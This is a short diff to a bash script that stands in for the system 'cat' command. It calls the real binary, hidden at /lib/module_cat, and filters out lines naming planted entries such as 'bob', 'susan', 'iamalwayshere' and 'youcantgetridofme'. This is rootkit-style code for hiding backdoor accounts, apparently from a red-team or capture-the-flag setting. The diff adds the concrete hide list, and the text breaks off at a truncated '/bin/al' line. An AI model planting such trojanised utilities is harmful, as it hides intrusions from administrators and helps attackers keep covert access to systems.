@@ -1,6 +1,6 @@
 #!/bin/bash
 
 # Execute real 'cat' command and don't display anything. Also mess with them
-/lib/module_cat $@ | grep -Ev "HIDE STRING HERE"
+/lib/module_cat $@ | grep -Ev "devbl|bob|susan|kat|simon|batman|iamalwayshere|youcantgetridofme|hehe"
 
 /bin/al
